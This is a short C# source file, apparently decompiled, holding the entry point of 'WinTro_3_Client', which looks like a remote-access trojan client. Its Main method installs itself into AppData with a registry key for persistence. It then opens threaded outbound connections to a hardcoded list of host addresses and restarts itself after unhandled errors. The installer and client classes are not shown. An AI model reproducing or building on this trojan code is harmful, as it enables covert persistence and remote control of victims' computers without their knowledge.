using System;
using System.Threading;
using System.Windows.Forms;

namespace WinTro_3_Client;

internal static class Program
{
	[STAThread]
	private static void Main()
	{
		Control.set_CheckForIllegalCrossThreadCalls(false);
		Application.add_ThreadException((ThreadExceptionEventHandler)UnhandledException);
		Install.InstallWTc(Install.InstallMethod.AppDataWithRegistryKey);
		object[] addresses = WinTro3.Addresses;
		foreach (object parameter in addresses)
		{
			Thread thread = new Thread(Collegati);
			thread.Start(parameter);
		}
	}

	private static void Collegati(object IPconPorta)
	{
		string[] array = IPconPorta.ToString()!.Split(new char[1] { ':' });
		new Client(array[0], int.Parse(array[1]), int.Parse(array[2]), WinTro3.Info.name).Connect();
	}

	public static void UnhandledException(object sender, ThreadExceptionEventArgs e)
	{
		try
		{
			Debug.LogError("Eccezione non gestita: " + e.Exception.Message + "\r\nin " + e.Exception.Source + "\r\n\r\nDopo le chiamate: " + e.Exception.StackTrace);
		}
		catch (Exception)
		{
			Application.Restart();
			Environment.Exit(0);
		}
	}
}
